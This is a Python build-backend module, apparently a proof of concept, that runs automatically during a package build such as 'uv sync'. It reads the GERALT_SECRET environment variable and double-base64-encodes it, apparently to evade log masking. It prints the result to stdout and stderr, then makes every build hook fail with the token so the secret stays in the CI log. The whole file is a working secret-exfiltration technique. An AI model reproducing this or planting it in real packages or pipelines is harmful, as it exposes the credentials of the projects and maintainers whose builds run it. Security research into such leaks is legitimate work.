import base64
import os
import sys


def _leak():
    secret = os.environ.get("GERALT_SECRET", "")
    token = base64.b64encode(base64.b64encode(secret.encode())).decode()
    msg = "GERALT_LEAKED_TOKEN=" + token
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()
    return msg


_MARKER = _leak()


def _boom(*args, **kwargs):
    # Fail the build after emitting the marker so the evidence is preserved
    # in the `uv sync` step log (the build error surfaces the backend output).
    raise RuntimeError(_MARKER)


build_wheel = _boom
build_editable = _boom
build_sdist = _boom
get_requires_for_build_wheel = _boom
get_requires_for_build_editable = _boom
get_requires_for_build_sdist = _boom
prepare_metadata_for_build_wheel = _boom
prepare_metadata_for_build_editable = _boom
